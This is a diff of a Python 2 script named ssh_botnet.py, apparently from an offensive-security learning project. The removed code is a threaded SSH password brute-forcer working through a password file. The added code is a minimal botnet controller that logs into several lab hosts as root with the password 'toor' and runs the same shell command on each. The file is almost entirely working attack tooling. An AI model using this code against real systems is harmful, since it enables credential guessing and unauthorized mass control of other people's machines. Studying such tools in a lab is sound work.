@@ -6,94 +6,62 @@
 
     Usage:
         ssh_botnet.py
-        ssh_botnet.py [<host> <user> <password>]
         ssh_botnet.py (-h | --help)
+        ssh_botnet.py (-v | --version)
 
     Options:
-        --host          remote hostname
-        --user          remote username
-        --password      password file path
         -h --help       Show this screen.
         --version       Show version
 """
 
 import pxssh
-import time
-from docopt import docopt
-from threading import Thread, BoundedSemaphore
 from utilities import escape_color
 
 
-maxConnections = 5
-connection_lock = BoundedSemaphore(value=maxConnections)
-Found = False
-Fails = 0
+class Client:
+    def __init__(self, host, user, password):
+        self.host = host
+        self.user = user
+        self.password = password
+        self.session = self.connect()
+
+    def connect(self):
+        try:
+            ssh = pxssh.pxssh()
+            ssh.login(self.host, self.user, self.password)
+
+            return ssh
+        except Exception, e:
+            print escape_color('[-] Error Connecting', "red")
+            print e
+
+    def send_command(self, cmd):
+        self.session.sendline(cmd)
+        self.session.prompt()
+
+        return self.session.before
 
 
-def send_command(s, cmd):
-    s.sendline(cmd)
-    s.prompt()
-    print s.before
+def botnet_command(command, botnet):
+    for client in botnet:
+        output = client.send_command(command)
+        print escape_color('[*] Output from ' + client.host, "green")
+        print '[+] ' + output + '\n'
 
 
-def connect(host, user, password, release):
-    global Found
-    global Fails
-
-    try:
-        s = pxssh.pxssh()
-        s.login(host, user, password)
-        print escape_color('[+] Password Found: ' + password, "green", False)
-        Found = True
-    except Exception, e:
-        if 'read_nonblocking' in str(e):
-            Fails += 1
-            time.sleep(5)
-            connect(host, user, password, False)
-        elif 'synchronize with original prompt' in str(e):
-            time.sleep(1)
-            connect(host, user, password, False)
-    finally:
-        if release:
-            connection_lock.release()
+def add_client(host, user, password, botnet):
+    client = Client(host, user, password)
+    botnet.append(client)
 
 
-def main(arguments):
-    if not arguments['<host>']:
-        host = raw_input("hostname: ")
-    else:
-        host = arguments['<host>']
+def main():
+    botnet = []
 
-    if not arguments['<user>']:
-        user = raw_input("user: ")
-    else:
-        user = arguments['<user>']
+    add_client('10.10.10.110', 'root', 'toor', botnet)
+    add_client('10.10.10.120', 'root', 'toor', botnet)
+    add_client('10.10.10.130', 'root', 'toor', botnet)
+    botnet_command('uname -v', botnet)
 
-    if not arguments['<password>']:
-        passwdFile = raw_input("Password File: ")
-    else:
-        passwdFile = arguments['<password>']
-
-    if host is None or passwdFile is None or user is None:
-        print __doc__
-        exit(0)
-
-    fn = open(passwdFile, 'r')
-    for line in fn.readlines():
-        if Found:
-            print escape_color("[*] Exiting: Password Found", "green", False)
-            exit(0)
-        if Fails > 5:
-            print escape_color("[!] Exiting: Too Many Socket Timeouts", "red", False)
-            exit(0)
-
-        connection_lock.acquire()
-        password = line.strip('\r').strip('\n')
-        print "[-] Testing: " + str(password)
-
-        t = Thread(target=connect, args=(host, user, password, True))
-        t.start()
 
 if __name__ == '__main__':
-    arguments = docopt(__doc__)
-    main(arguments)
+    main()
